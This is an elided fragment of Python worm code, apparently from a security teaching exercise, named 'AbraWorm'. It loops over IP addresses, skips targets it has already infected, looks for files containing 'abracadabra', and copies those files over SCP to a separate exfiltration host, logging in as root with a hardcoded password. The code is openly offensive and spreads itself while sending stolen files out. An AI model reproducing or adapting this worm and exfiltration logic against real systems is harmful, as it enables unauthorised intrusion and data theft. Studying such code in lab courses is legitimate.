            ...
            for ip_address in get_fresh_ipaddresses(NHOSTS):
                ...
                try:
                    ...
                    print("\n\noutput of 'ls' command: %s" %
                        str(received_list))
                    if str(received_list).find('AbraWorm') >= 0:
                        print("\nThe target machine is already infected\n")
                        continue
                    # Now let's recursively look for files that contain the string 'abracadabra'
                ...
                if len(files_of_interest_at_target) > 0:
                    ...
                    try:
                        ...
                        ssh.connect('172.17.0.6', port=22, username='root',
                                    password='mypassword', timeout=5)
                        scpcon = scp.SCPClient(ssh.get_transport())
                        print("\n\nconnected to exfiltration host\n")
                        for filename in files_of_interest_at_target:
                            regular_filename = filename.decode('utf-8')
                            last_slash_idx = regular_filename.rfind('/')
                            filename = (
                                regular_filename[last_slash_idx+1:]).encode('utf-8')
                            scpcon.put(filename)
                        scpcon.close()
